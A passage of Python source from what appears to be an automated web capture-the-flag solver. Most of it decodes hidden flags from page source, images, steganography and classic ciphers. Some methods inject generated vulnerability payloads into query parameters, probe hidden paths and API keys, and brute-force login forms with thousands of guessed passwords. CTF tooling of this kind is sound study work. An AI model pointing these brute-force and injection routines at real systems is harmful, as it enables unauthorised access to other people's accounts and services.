        try:
            # Fetch the page
            response = self.session.get(url, timeout=self.timeout)
            
            # Get all JS content
            soup = BeautifulSoup(response.text, 'html.parser')
            js_content = ""
            for script in soup.find_all('script'):
                if script.string:
                    js_content += script.string + "\n"
                src = script.get('src')
                if src:
                    try:
                        js_url = urljoin(url, src)
                        js_response = self.session.get(js_url, timeout=5)
                        if js_response.status_code == 200:
                            js_content += js_response.text + "\n"
                    except:
                        pass
            
            # Deep analysis with CTF Brain
            analysis = self.ctf_brain.analyze_challenge(response.text, js_content)
            
            result.add_log(f"CTF Brain found: {len(analysis['hints'])} hints, {len(analysis['patterns_detected'])} patterns")
            result.add_log(f"Vulnerabilities: {[v['type'] for v in analysis['vulnerabilities']]}")
            result.add_log(f"Suggested: {analysis['suggested_techniques']}")
            
            # Check for similar solved challenges
            similar = self.ctf_brain.get_similar_challenges(url, analysis['patterns_detected'])
            if similar:
                result.add_log(f"Found {len(similar)} similar solved challenges")
                for sim in similar[:3]:
                    result.add_log(f"  Similar: {sim['method']} -> {sim['flag'][:30] if sim['flag'] else 'N/A'}...")
            
            # Try XOR decoding on detected fragments
            for fragment in analysis.get('fragments', []):
                if fragment.get('type') == 'xor':
                    data = fragment.get('data', [])
                    if data:
                        for key in [11, 13, 7, 42, 255, 128, 64, 32, 16, 8, 4, 2, 1, 77, 99]:
                            try:
                                decoded = ''.join(chr(n ^ key) for n in data if 0 <= (n ^ key) <= 127)
                                if decoded and all(c.isprintable() or c.isspace() for c in decoded):
                                    result.add_log(f"XOR decoded (key={key}): {decoded}")
                                    flag = self.extract_flag(decoded)
                                    if flag:
                                        return flag
                            except:
                                pass
            
            # Try Base64 decoding on found encodings
            for enc in analysis.get('encodings_found', []):
                if enc.get('type') == 'base64':
                    try:
                        data = enc.get('data', '')
                        padded = data + '=' * (4 - len(data) % 4) if len(data) % 4 else data
                        decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
                        if decoded:
                            result.add_log(f"Base64 decoded: {decoded[:50]}...")
                            flag = self.extract_flag(decoded)
                            if flag:
                                return flag
                    except:
                        pass
            
            # Try API endpoints discovered
            for endpoint in analysis.get('api_endpoints', [])[:10]:
                try:
                    api_url = urljoin(url, endpoint)
                    api_response = self.session.get(api_url, timeout=5)
                    if api_response.status_code == 200:
                        flag = self.extract_flag(api_response.text)
                        if flag:
                            result.add_log(f"Found flag at API endpoint: {endpoint}")
                            return flag
                except:
                    pass
            
            # Try hidden paths discovered
            for path in analysis.get('hidden_paths', [])[:15]:
                try:
                    path_url = urljoin(url, path)
                    path_response = self.session.get(path_url, timeout=5)
                    if path_response.status_code == 200:
                        flag = self.extract_flag(path_response.text)
                        if flag:
                            result.add_log(f"Found flag at hidden path: {path}")
                            return flag
                except:
                    pass
            
            # Try vulnerability exploits
            for vuln in analysis['vulnerabilities']:
                vuln_type = vuln['type']
                result.add_log(f"Trying {vuln_type} exploit...")
                
                payloads = self.ctf_brain.generate_payloads(vuln_type)
                for payload in payloads[:15]:
                    try:
                        # Try payload in common parameters
                        for param in ['id', 'user', 'name', 'query', 'search', 'q', 'input', 'data']:
                            test_url = f"{url}?{param}={payload}"
                            test_response = self.session.get(test_url, timeout=5)
                            flag = self.extract_flag(test_response.text)
                            if flag:
                                result.add_log(f"Found flag with {vuln_type} payload on {param}")
                                return flag
                    except:
                        pass
            
            # Use smart bruteforcer for login forms
            if 'login_form' in analysis['patterns_detected'] and self.smart_bruteforcer:
                result.add_log("Attempting smart bruteforce on login form...")
                context = {
                    'url': url,
                    'hints': analysis['hints'],
                    'keywords': analysis['keywords'],
                    'numbers': analysis['numbers'],
                }
                passwords = self.ctf_brain.generate_passwords(context, max_count=500)
                
                # Find login form
                forms = soup.find_all('form')
                for form in forms:
                    password_input = form.find('input', {'type': 'password'})
                    if password_input:
                        action = form.get('action', '')
                        form_url = urljoin(url, action) if action else url
                        
                        for pwd in passwords[:100]:
                            try:
                                data = {'password': pwd, 'pass': pwd, 'pwd': pwd}
                                resp = self.session.post(form_url, data=data, timeout=5)
                                flag = self.extract_flag(resp.text)
                                if flag:
                                    result.add_log(f"Login successful with password: {pwd}")
                                    return flag
                            except:
                                pass
            
            result.add_log("CTF Brain could not find a solution")
            
        except Exception as e:
            result.add_log(f"CTF Brain error: {e}")
        
        return None
    
    def _check_source_code(self, url: str, result: ChallengeResult) -> str:
        """Check HTML source and JS files for flags and sensitive info"""
        result.add_log("Checking source code...")
        response = self.session.get(url, timeout=self.timeout)
        
        # Parse HTML first to check for decoys
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # PRIORITY 0: Check for meta tag hash derivation (like idiotmute challenge)
        flag = self._check_meta_tag_hash(soup, response.text, result)
        if flag:
            return flag
        
        # PRIORITY 1: Check external JavaScript files FIRST (real flags are often here)
        result.add_log("Checking external JS files...")
        scripts = soup.find_all('script')
        all_js_content = ""
        
        for script in scripts:
            src = script.get('src')
            if src:
                try:
                    js_url = urljoin(url, src)
                    result.add_log(f"Fetching: {js_url}")
                    js_response = self.session.get(js_url, timeout=self.timeout)
                    if js_response.status_code == 200:
                        all_js_content += js_response.text + "\n"
                        # Check for hidden variables and encoded data (with decoy detection)
                        flag = self._extract_js_secrets(js_response.text, result)
                        if flag:
                            result.add_log(f"Found hidden flag in JS: {src}")
                            return flag
                        # Check for standard flags (but verify not decoy)
                        flag = self.extract_flag(js_response.text)
                        if flag and not self._is_decoy_flag(flag, js_response.text):
                            result.add_log(f"Found flag in JS file: {src}")
                            return flag
                        # Check for MD5 hashes or hints
                        self._extract_js_hints(js_response.text, result)
                except Exception as e:
                    result.add_log(f"Error fetching {src}: {e}")
        
        # PRIORITY 2: Check inline JavaScript
        for script in scripts:
            if script.string:
                all_js_content += script.string + "\n"
                # Check for hidden variables (with decoy detection)
                flag = self._extract_js_secrets(script.string, result)
                if flag:
                    return flag
                flag = self.extract_flag(script.string)
                if flag and not self._is_decoy_flag(flag, script.string):
                    result.add_log("Found flag in inline JavaScript")
                    return flag
        
        # Try to crack any MD5 hashes found in JS
        flag = self._try_crack_js_hashes(all_js_content, result, url)
        if flag:
            return flag
        
        # PRIORITY 3: Check response body (but skip decoy sections)
        # Remove decoy sections from HTML before checking
        decoy_elements = soup.find_all(id=lambda x: x and 'decoy' in x.lower())
        for decoy in decoy_elements:
            decoy.decompose()
        
        clean_html = str(soup)
        flag = self.extract_flag(clean_html)
        if flag and not self._is_decoy_flag(flag, response.text):
            result.add_log(f"Found flag in source: {flag}")
            return flag
        
        # Check headers
        for header, value in response.headers.items():
            flag = self.extract_flag(f"{header}: {value}")
            if flag:
                result.add_log(f"Found flag in header {header}")
                return flag
        
        # Re-parse HTML (since we modified soup)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Check HTML comments (including hidden ones) - but skip decoy comments
        import re as regex_module
        html_comments = regex_module.findall(r'<!--(.*?)-->', response.text, regex_module.DOTALL)
        for comment in html_comments:
            # Skip decoy comments
            if 'decoy' in comment.lower() or 'misdirection' in comment.lower():
                continue
            
            # PRIORITY: Check for base64 encoded flags in comments first
            b64_matches = regex_module.findall(r'[A-Za-z0-9+/]{16,}={0,2}', comment)
            for b64_match in b64_matches:
                try:
                    # Add padding if needed
                    padded = b64_match
                    padding = 4 - len(padded) % 4
                    if padding != 4:
                        padded += '=' * padding
                    decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
                    # Check if decoded contains a flag pattern
                    if regex_module.search(r'flag\{|ctf\{|key\{', decoded, regex_module.IGNORECASE):
                        # Extract the actual flag
                        flag_match = regex_module.search(r'\w*flag\{[^}]+\}|\w*ctf\{[^}]+\}|\w*key\{[^}]+\}', decoded, regex_module.IGNORECASE)
                        if flag_match:
                            flag = flag_match.group(0)
                            result.add_log(f"Found base64 encoded flag in comment: {flag}")
                            return flag
                except:
                    pass
            
            # Then check for direct flag patterns
            flag = self.extract_flag(comment)
            if flag and not self._is_decoy_flag(flag, response.text):
                result.add_log("Found flag in HTML comment")
                return flag
            # Check for base64 fragments
            b64_flag = self._extract_base64_fragments(comment, result)
            if b64_flag and not self._is_decoy_flag(b64_flag, response.text):
                return b64_flag
        
        # Check for hidden inputs (skip those in decoy containers)
        hidden_inputs = soup.find_all('input', {'type': 'hidden'})
        for inp in hidden_inputs:
            # Skip if inside a decoy container
            parent_ids = [p.get('id', '') for p in inp.parents if p.get('id')]
            if any('decoy' in pid.lower() for pid in parent_ids):
                continue
            value = inp.get('value', '')
            flag = self.extract_flag(value)
            if flag and not self._is_decoy_flag(flag, response.text):
                result.add_log("Found flag in hidden input")
                return flag
        
        # Check data attributes for hidden data (SKIP DECOY CONTAINERS)
        for elem in soup.find_all(attrs={"data-flag": True}):
            # Skip if inside a decoy container
            parent_ids = [p.get('id', '') for p in elem.parents if p.get('id')]
            if any('decoy' in pid.lower() for pid in parent_ids):
                result.add_log("Skipping decoy data-flag attribute")
                continue
            flag = elem.get('data-flag')
            if flag and not self._is_decoy_flag(flag, response.text):
                result.add_log("Found flag in data attribute")
                return flag
        
        for elem in soup.find_all(attrs={"data-secret": True}):
            # Skip if inside a decoy container
            parent_ids = [p.get('id', '') for p in elem.parents if p.get('id')]
            if any('decoy' in pid.lower() for pid in parent_ids):
                continue
            secret = elem.get('data-secret')
            decoded = CTFDecoder.try_all_decodings(secret, result.add_log)
            for d in decoded:
                if self._is_decoy_flag(d, response.text):
                    continue
                flag = self.extract_flag(d)
                if flag:
                    return flag
                if CTFDecoder._looks_english(d):
                    return d
        
        # Check CSS files for hidden data (including comments with base64)
        for link in soup.find_all('link', rel='stylesheet'):
            href = link.get('href')
            if href:
                try:
                    css_url = urljoin(url, href)
                    css_response = self.session.get(css_url, timeout=self.timeout)
                    if css_response.status_code == 200:
                        flag = self.extract_flag(css_response.text)
                        if flag and not self._is_decoy_flag(flag, css_response.text):
                            result.add_log(f"Found flag in CSS: {href}")
                            return flag
                        # Check CSS comments for base64 fragments
                        flag = self._extract_css_secrets(css_response.text, result)
                        if flag and not self._is_decoy_flag(flag, css_response.text):
                            result.add_log(f"Found flag in CSS comments: {href}")
                            return flag
                except:
                    pass
        
        # Check for audio files on main page (morse code challenges)
        audio_tags = soup.find_all(['audio', 'source'])
        for audio in audio_tags:
            src = audio.get('src')
            if src:
                result.add_log(f"Found audio file on main page: {src}")
                audio_url = urljoin(url, src)
                try:
                    audio_response = self.session.get(audio_url, timeout=15)
                    if audio_response.status_code == 200:
                        result.add_log(f"Downloaded audio ({len(audio_response.content)} bytes)")
                        decoded = CTFDecoder.decode_morse_audio(audio_response.content)
                        if decoded:
                            result.add_log(f"Decoded morse from audio: {decoded}")
                            return decoded
                except Exception as e:
                    result.add_log(f"Error with audio: {e}")
        
        # Check for images with potential steganography (look for references in JS)
        flag = self._check_image_steganography(url, all_js_content, result)
        if flag:
            return flag
        
        # LIGHTWEIGHT HINT FOLLOWING - follow paths mentioned in JS comments/hints
        flag = self._follow_hint_paths(url, all_js_content, response.text, result)
        if flag:
            return flag
        
        # Skip heavy path discovery in source code check - it's done separately
        # flag = self._check_xor_api_challenge(url, response.text, all_js_content, result)
        # flag = self._discover_hidden_paths(url, result)
        # flag = self._try_api_endpoints(url, result)
        
        return None
    
    def _check_xor_api_challenge(self, url: str, html_content: str, js_content: str, result: ChallengeResult) -> str:
        """Check for XOR encoded arrays and API key challenges"""
        result.add_log("Checking for XOR/API key challenges...")
        
        fragments = []
        
        # Pattern 1: Look for XOR encoded arrays in JS
        # e.g., const fragment1Encoded = [70, 64, 94, 71, 95, 89, 74];
        xor_array_pattern = r'(?:const|let|var)\s+(\w*(?:encoded|fragment|key|secret)\w*)\s*=\s*\[([0-9,\s]+)\]'
        xor_matches = re.findall(xor_array_pattern, js_content, re.IGNORECASE)
        
        for var_name, array_str in xor_matches:
            try:
                # Parse the array
                nums = [int(n.strip()) for n in array_str.split(',') if n.strip().isdigit()]
                if len(nums) >= 3:
                    result.add_log(f"Found encoded array: {var_name} = [{len(nums)} numbers]")
                    
                    # Look for XOR key in comments or code
                    xor_key_patterns = [
                        r'XOR\s*(?:with|key)?[:\s]*(\d+)',
                        r'\^\s*(\d+)',
                        r'xor[_\s]*key[:\s=]*(\d+)',
                    ]
                    
                    xor_key = None
                    for pattern in xor_key_patterns:
                        match = re.search(pattern, js_content, re.IGNORECASE)
                        if match:
                            xor_key = int(match.group(1))
                            break
                    
                    # Try common XOR keys if not found
                    keys_to_try = [xor_key] if xor_key else [11, 13, 7, 42, 255, 128, 64, 32]
                    
                    for key in keys_to_try:
                        if key is None:
                            continue
                        try:
                            decoded = ''.join(chr(n ^ key) for n in nums if 0 <= (n ^ key) <= 127)
                            if decoded and len(decoded) >= 3:
                                # Check if it looks like readable text
                                if all(c.isprintable() or c.isspace() for c in decoded):
                                    result.add_log(f"XOR decoded (key={key}): {decoded}")
                                    fragments.append(decoded)
                                    
                                    # Check if it's a flag directly
                                    flag = self.extract_flag(decoded)
                                    if flag:
                                        return flag
                                    break
                        except:
                            pass
            except:
                pass
        
        # Pattern 2: Look for base64 clues in HTML comments
        b64_clue_pattern = r'<!--[^>]*(?:BASE64|B64|CLUE|HINT)[_\s:]*([A-Za-z0-9+/=]+)[^>]*-->'
        b64_matches = re.findall(b64_clue_pattern, html_content, re.IGNORECASE)
        
        for b64_str in b64_matches:
            try:
                # Add padding if needed
                padded = b64_str
                padding = 4 - len(padded) % 4
                if padding != 4:
                    padded += '=' * padding
                decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
                if decoded and len(decoded) >= 2:
                    result.add_log(f"Base64 clue decoded: {decoded}")
                    fragments.append(decoded)
                    
                    # Check if it's a flag directly
                    flag = self.extract_flag(decoded)
                    if flag:
                        return flag
            except:
                pass
        
        # Pattern 3: Look for API endpoints that need keys
        api_patterns = [
            r'fetch\s*\(\s*[\'"]([^\'"]+)[\'"][^)]*headers[^}]*[\'"]X-ACCESS[\'"]\s*:\s*(\w+)',
            r'[\'"]X-ACCESS[\'"]\s*:\s*(\w+)',
            r'/admin',
            r'/api/flag',
            r'/api/secret',
        ]
        
        api_endpoints = []
        for pattern in api_patterns:
            if re.search(pattern, js_content, re.IGNORECASE):
                # Found API endpoint reference
                endpoint_match = re.search(r'fetch\s*\(\s*[\'"]([^\'"]+)[\'"]', js_content)
                if endpoint_match:
                    api_endpoints.append(endpoint_match.group(1))
        
        # Also check for common admin endpoints
        api_endpoints.extend(['/admin', '/api/flag', '/api/secret', '/api/key'])
        
        # If we have fragments, try to combine them and use as API key
        if fragments:
            result.add_log(f"Found {len(fragments)} fragments: {fragments}")
            
            # Try different combinations
            separators = ['-', '_', '', '.', ':']
            
            # Generate all permutations of fragments with different separators
            from itertools import permutations
            
            for perm in permutations(fragments):
                for sep in separators:
                    key = sep.join(perm)
                    
                    # Try this key against API endpoints
                    base_url = url.rstrip('/')
                    for endpoint in api_endpoints:
                        try:
                            api_url = urljoin(base_url, endpoint)
                            
                            # Try with X-ACCESS header
                            response = self.session.get(
                                api_url,
                                headers={'X-ACCESS': key},
                                timeout=5
                            )
                            
                            if response.status_code == 200:
                                try:
                                    data = response.json()
                                    if 'flag' in data:
                                        flag = data['flag']
                                        result.add_log(f"Found flag via API with key '{key}': {flag}")
                                        return flag
                                    
                                    # Check response text for flag
                                    flag = self.extract_flag(str(data))
                                    if flag:
                                        result.add_log(f"Found flag in API response: {flag}")
                                        return flag
                                except:
                                    # Not JSON, check text
                                    flag = self.extract_flag(response.text)
                                    if flag:
                                        return flag
                        except:
                            pass
        
        # Try fragment puzzle solving with CTF Brain
        if self.ctf_brain and fragments:
            flag = self._solve_fragment_puzzle(url, html_content, js_content, fragments, result)
            if flag:
                return flag
        
        return None
    
    def _solve_fragment_puzzle(self, url: str, html_content: str, js_content: str, 
                               fragments: List[str], result: ChallengeResult) -> str:
        """Solve fragment-based puzzle challenges using CTF Brain"""
        result.add_log(f"Attempting to solve fragment puzzle with {len(fragments)} fragments...")
        
        # Extract hints from HTML comments
        hints = re.findall(r'<!--\s*(.*?)\s*-->', html_content, re.DOTALL)
        
        # Look for order hints in comments
        order_hints = []
        for hint in hints:
            hint_lower = hint.lower()
            if 'order' in hint_lower or 'sequence' in hint_lower or 'first' in hint_lower:
                order_hints.append(hint)
            if 'capital' in hint_lower or 'new delhi' in hint_lower:
                order_hints.append(hint)
        
        result.add_log(f"Found {len(hints)} hints, {len(order_hints)} order hints")
        
        # Build context for CTF Brain
        context = {
            'url': url,
            'hints': hints,
            'fragments': fragments,
            'keywords': [],
            'numbers': re.findall(r'\b\d{2,}\b', html_content + js_content),
            'patterns': ['fragment_puzzle'],
        }
        
        # Generate password combinations using CTF Brain
        passwords = self.ctf_brain.generate_passwords(context, max_count=2000)
        
        # Also add manual fragment combinations
        from itertools import permutations
        separators = ['-', '_', '', '.', ':', '+', ' ']
        
        for perm in permutations(fragments):
            for sep in separators:
                pwd = sep.join(perm)
                if pwd not in passwords:
                    passwords.append(pwd)
                
                # Also try with dashes between each character
                expanded = []
                for frag in perm:
                    expanded.extend(list(frag))
                pwd_expanded = sep.join(expanded)
                if pwd_expanded not in passwords:
                    passwords.append(pwd_expanded)
        
        # Look for login form
        login_endpoints = ['/login.php', '/login', '/submit', '/check', '/verify']
        base_url = url.rstrip('/')
        
        for endpoint in login_endpoints:
            login_url = urljoin(base_url, endpoint)
            
            # Try each password
            for i, password in enumerate(passwords[:5000]):  # Limit attempts
                if i % 100 == 0:
                    result.add_log(f"Trying password {i}/{min(5000, len(passwords))}...")
                
                try:
                    response = self.session.post(login_url, data={
                        'password': password,
                        'pass': password,
                        'passwd': password,
                        'key': password,
                    }, timeout=5, allow_redirects=True)
                    
                    # Check for success indicators
                    if 'secret' in response.url or 'success' in response.text.lower() or 'correct' in response.text.lower():
                        flag = self.extract_flag(response.text)
                        if flag:
                            result.add_log(f"Fragment puzzle solved with password: {password}")
                            
                            # Learn from success
                            self.ctf_brain.learn_from_solution(
                                url=url,
                                flag=flag,
                                method='fragment_puzzle',
                                patterns=['fragment_puzzle'],
                                fragments=fragments,
                                password=password
                            )
                            return flag
                    
                    # Check response for flag even without redirect
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Found flag with password: {password}")
                        return flag
                        
                except Exception as e:
                    continue
        
        return None
    
    def _check_image_steganography(self, url: str, js_content: str, result: ChallengeResult) -> str:
        """Check for steganography in images referenced in the page"""
        result.add_log("Checking for image steganography...")
        
        # Look for image references in JavaScript that might contain hidden data
        image_patterns = [
            r'["\']([^"\']*\.(?:png|jpg|jpeg|gif|bmp))["\']',
            r'src\s*=\s*["\']([^"\']*\.(?:png|jpg|jpeg|gif|bmp))["\']',
            r'\.src\s*=\s*["\']([^"\']+)["\']',
        ]
        
        image_urls = set()
        for pattern in image_patterns:
            matches = re.findall(pattern, js_content, re.IGNORECASE)
            for match in matches:
                if not match.startswith('http') and not match.startswith('//'):
                    # Relative URL
                    if match.endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                        image_urls.add(match)
        
        # Also check common steganography image names AND numbered images
        common_stego_images = [
            'Suspect.png', 'suspect.png', 'hidden.png', 'secret.png',
            'flag.png', 'target.png', 'image.png', 'photo.png',
            'mystery.png', 'clue.png', 'evidence.png',
            # Download/output images (common in CTF)
            'download.png', 'Download.png', 'output.png', 'Output.png',
            'result.png', 'Result.png', 'final.png', 'Final.png',
            # Numbered images (often one is a decoy, another has the flag)
            'image1.png', 'image2.png', 'image3.png', 'image4.png', 'image5.png',
            'img1.png', 'img2.png', 'img3.png',
            'photo1.png', 'photo2.png', 'photo3.png',
            'pic1.png', 'pic2.png', 'pic3.png',
            'file1.png', 'file2.png', 'file3.png',
            # JPEG variants
            'images.jpeg', 'image.jpeg', 'photo.jpeg', 'download.jpeg',
            'images.jpg', 'image.jpg', 'photo.jpg', 'download.jpg',
        ]
        
        for img_name in common_stego_images:
            image_urls.add(img_name)
        
        base_url = url.rstrip('/')
        
        # Sort images: prioritize PNG over JPEG (PNG is lossless, better for LSB steganography)
        # Also prioritize 'download', 'output', 'result' names as they often contain the real flag
        def image_priority(img_path):
            img_lower = img_path.lower()
            priority = 0
            # PNG files get highest priority (lossless = better for steganography)
            if img_lower.endswith('.png'):
                priority -= 100
            # JPEG files get lower priority (lossy compression destroys LSB data)
            elif img_lower.endswith(('.jpg', '.jpeg')):
                priority += 100
            # Prioritize common CTF flag image names
            if 'download' in img_lower or 'output' in img_lower or 'result' in img_lower:
                priority -= 50
            if 'flag' in img_lower or 'secret' in img_lower or 'hidden' in img_lower:
                priority -= 40
            if 'suspect' in img_lower or 'target' in img_lower:
                priority -= 30
            return priority
        
        sorted_images = sorted(image_urls, key=image_priority)
        
        # Collect all valid steganography results to find the best one
        stego_results = []
        
        for img_path in sorted_images:
            try:
                img_url = urljoin(base_url + '/', img_path)
                response = self.session.get(img_url, timeout=10)
                
                if response.status_code == 200 and len(response.content) > 10:
                    content_type = response.headers.get('content-type', '')
                    
                    # IMPORTANT: Check if "image" file is actually text (misleading extension)
                    # This catches challenges like image2.png containing morse code
                    content = response.content
                    is_text_file = False
                    
                    # Check if content is actually text (not binary image data)
                    try:
                        text_content = content.decode('utf-8', errors='strict')
                        # If it decodes cleanly and doesn't start with image magic bytes, it's text
                        if not content.startswith(b'\x89PNG') and not content.startswith(b'\xff\xd8\xff'):
                            is_text_file = True
                    except:
                        pass
                    
                    if is_text_file:
                        result.add_log(f"Found text file disguised as image: {img_path}")
                        text_content = content.decode('utf-8', errors='ignore').strip()
                        result.add_log(f"Content: {text_content[:200]}")
                        
                        # Check for morse code
                        if '.' in text_content and '-' in text_content:
                            # Looks like morse code
                            morse_match = re.search(r'([.\-\s/]+)', text_content)
                            if morse_match:
                                morse_text = morse_match.group(1).strip()
                                result.add_log(f"Found morse code: {morse_text}")
                                
                                # Decode morse
                                decoded_morse = CTFDecoder.decode_morse(morse_text)
                                if decoded_morse:
                                    result.add_log(f"Morse decoded: {decoded_morse}")
                                    
                                    # Check for Caesar cipher hint
                                    caesar_hint = re.search(r'[Cc]aesar\s*(?:shift|cipher)?\s*[=:]\s*(\d+)', text_content)
                                    if caesar_hint:
                                        shift = int(caesar_hint.group(1))
                                        result.add_log(f"Found Caesar hint: shift {shift}")
                                        
                                        # Try both directions - encode (add shift) and decode (subtract shift)
                                        # "shift = 3" could mean either direction
                                        
                                        # Try encode direction first (add shift, same as decode with 26-shift)
                                        caesar_encoded = CTFDecoder.decode_caesar(decoded_morse, 26 - shift)
                                        if caesar_encoded and self._looks_like_flag(caesar_encoded):
                                            result.add_log(f"Caesar encode (shift {shift}): {caesar_encoded}")
                                            return caesar_encoded
                                        
                                        # Try decode direction (subtract shift)
                                        caesar_decoded = CTFDecoder.decode_caesar(decoded_morse, shift)
                                        if caesar_decoded and self._looks_like_flag(caesar_decoded):
                                            result.add_log(f"Caesar decode (shift {shift}): {caesar_decoded}")
                                            return caesar_decoded
                                        
                                        # If neither looks like a flag, return the encoded one (more common)
                                        if caesar_encoded:
                                            result.add_log(f"Caesar encode (shift {shift}): {caesar_encoded}")
                                            return caesar_encoded
                                    
                                    # Try all Caesar shifts
                                    for shift in range(1, 26):
                                        caesar_decoded = CTFDecoder.decode_caesar(decoded_morse, shift)
                                        if caesar_decoded and self._looks_like_flag(caesar_decoded):
                                            result.add_log(f"Caesar decoded (shift {shift}): {caesar_decoded}")
                                            return caesar_decoded
                                    
                                    # Return morse decoded if no Caesar needed
                                    return decoded_morse
                        
                        # Check for direct flag
                        flag = self.extract_flag(text_content)
                        if flag:
                            return flag
                        
                        # Try all decodings
                        decoded_results = CTFDecoder.try_all_decodings(text_content, None)
                        for decoded in decoded_results:
                            flag = self.extract_flag(decoded)
                            if flag:
                                return flag
                    
                    elif 'image' in content_type and len(response.content) > 1000:
                        result.add_log(f"Checking image for steganography: {img_path}")
                        
                        # Try LSB steganography
                        hidden_text = CTFDecoder.decode_image_lsb(response.content)
                        if hidden_text:
                            result.add_log(f"Found hidden text in {img_path}: {hidden_text}")
                            
                            # Check if this looks like a valid flag (readable English)
                            if self._looks_like_english_text(hidden_text):
                                result.add_log(f"Valid English text found in {img_path}: {hidden_text}")
                                return hidden_text
                            else:
                                # Store for later - might be the only result
                                stego_results.append((img_path, hidden_text, self._text_quality_score(hidden_text)))
                        
                        # Try EXIF metadata extraction
                        flag = self._check_image_metadata(response.content, result)
                        if flag:
                            return flag
                        
                        # Try PNG chunk analysis
                        flag = self._check_png_chunks(response.content, result)
                        if flag:
                            return flag
            except Exception as e:
                pass
        
        # If we collected any steganography results, return the best one
        if stego_results:
            # Sort by quality score (higher is better)
            stego_results.sort(key=lambda x: x[2], reverse=True)
            best_img, best_text, best_score = stego_results[0]
            result.add_log(f"Best steganography result from {best_img} (score: {best_score}): {best_text}")
            return best_text
        
        return None
    
    def _looks_like_english_text(self, text: str) -> bool:
        """Check if text looks like readable English (not garbage)"""
        if not text or len(text) < 3:
            return False
        
        # Check if it contains mostly letters and spaces
        alpha_count = sum(1 for c in text if c.isalpha() or c.isspace())
        if alpha_count < len(text) * 0.6:
            return False
        
        # Common English words that indicate valid text
        common_words = [
            'the', 'and', 'for', 'are', 'but', 'not', 'you', 'all',
            'can', 'had', 'her', 'was', 'one', 'our', 'out', 'day',
            'get', 'has', 'him', 'his', 'how', 'its', 'may', 'new',
            'now', 'old', 'see', 'two', 'way', 'who', 'boy', 'did',
            'man', 'more', 'meet', 'flag', 'key', 'shed', 'parking',
            'floor', 'room', 'door', 'hall', 'gate', 'exit', 'enter',
            'left', 'right', 'front', 'back', 'side', 'near', 'far',
            'first', 'second', 'third', 'fourth', 'fifth', 'last',
            'building', 'campus', 'office', 'library', 'court', 'basket',
        ]
        
        text_lower = text.lower()
        word_count = sum(1 for word in common_words if word in text_lower)
        
        return word_count >= 1
    
    def _text_quality_score(self, text: str) -> int:
        """Score text quality - higher is better (more English-like)"""
        if not text:
            return 0
        
        score = 0
        
        # Bonus for letters and spaces
        alpha_count = sum(1 for c in text if c.isalpha() or c.isspace())
        score += alpha_count * 2
        
        # Penalty for special characters
        special_count = sum(1 for c in text if not c.isalnum() and not c.isspace())
        score -= special_count * 5
        
        # Bonus for common English words
        common_words = [
            'the', 'and', 'for', 'are', 'but', 'not', 'you', 'all',
            'parking', 'shed', 'floor', 'room', 'door', 'hall', 'gate',
            'building', 'campus', 'office', 'library', 'court', 'basket',
            'meet', 'flag', 'key', 'secret', 'hidden', 'password',
        ]
        
        text_lower = text.lower()
        for word in common_words:
            if word in text_lower:
                score += 20
        
        return score
    
    def _looks_like_flag(self, text: str) -> bool:
        """Check if text looks like a valid flag/answer (readable words)"""
        if not text or len(text) < 3:
            return False
        
        # Check if it contains mostly letters and spaces
        alpha_count = sum(1 for c in text if c.isalpha() or c.isspace())
        if alpha_count < len(text) * 0.7:
            return False
        
        # Check for common English words
        common_words = ['the', 'and', 'for', 'are', 'but', 'not', 'you', 'all',
                       'can', 'had', 'her', 'was', 'one', 'our', 'out', 'day',
                       'get', 'has', 'him', 'his', 'how', 'its', 'may', 'new',
                       'now', 'old', 'see', 'two', 'way', 'who', 'boy', 'did',
                       'man', 'more', 'dill', 'mange', 'meet', 'flag', 'key']
        
        text_lower = text.lower()
        word_count = sum(1 for word in common_words if word in text_lower)
        
        return word_count >= 1
    
    def _check_image_metadata(self, image_data: bytes, result: ChallengeResult) -> str:
        """Check image EXIF metadata for hidden flags"""
        try:
            exif = CTFDecoder.extract_exif(image_data)
            if exif:
                result.add_log(f"Found EXIF metadata with {len(exif)} fields")
                
                # Check common fields for flags
                flag_fields = ['ImageDescription', 'UserComment', 'Artist', 'Copyright', 
                              'XPComment', 'XPTitle', 'XPSubject', 'XPKeywords']
                
                for field in flag_fields:
                    if field in exif:
                        value = str(exif[field])
                        flag = self.extract_flag(value)
                        if flag:
                            result.add_log(f"Found flag in EXIF {field}")
                            return flag
                        # Try decoding
                        decoded_results = CTFDecoder.try_all_decodings(value, None)
                        for decoded in decoded_results:
                            flag = self.extract_flag(decoded)
                            if flag:
                                return flag
        except:
            pass
        return None
    
    def _check_png_chunks(self, image_data: bytes, result: ChallengeResult) -> str:
        """Check PNG chunks for hidden data"""
        try:
            chunks = CTFDecoder.extract_png_chunks(image_data)
            
            for chunk in chunks:
                chunk_type = chunk['type']
                data = chunk['data']
                
                # Check text chunks (tEXt, iTXt, zTXt)
                if chunk_type in ['tEXt', 'iTXt', 'zTXt']:
                    try:
                        text = data.decode('utf-8', errors='ignore')
                        result.add_log(f"Found PNG text chunk: {text[:50]}...")
                        
                        flag = self.extract_flag(text)
                        if flag:
                            return flag
                        
                        # Try decoding
                        decoded_results = CTFDecoder.try_all_decodings(text, None)
                        for decoded in decoded_results:
                            flag = self.extract_flag(decoded)
                            if flag:
                                return flag
                    except:
                        pass
                
                # Check for data after IEND (appended data)
                if chunk_type == 'IEND':
                    # Check if there's data after IEND
                    iend_pos = image_data.find(b'IEND')
                    if iend_pos > 0:
                        after_iend = image_data[iend_pos + 8:]  # Skip IEND + CRC
                        if len(after_iend) > 10:
                            result.add_log(f"Found {len(after_iend)} bytes after IEND")
                            try:
                                text = after_iend.decode('utf-8', errors='ignore')
                                flag = self.extract_flag(text)
                                if flag:
                                    return flag
                            except:
                                pass
        except:
            pass
        return None
    
    def _check_cookies_localstorage(self, url: str, result: ChallengeResult) -> str:
        """Check cookies and localStorage references for flags - COMPREHENSIVE COOKIE MANIPULATION"""
        result.add_log("Checking cookies and localStorage...")
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            
            # PRIORITY 1: Check existing cookies
            for cookie in self.session.cookies:
                result.add_log(f"Found cookie: {cookie.name} = {cookie.value[:50]}...")
                
                # Check cookie value directly
                flag = self.extract_flag(cookie.value)
                if flag:
                    result.add_log(f"Found flag in cookie: {cookie.name}")
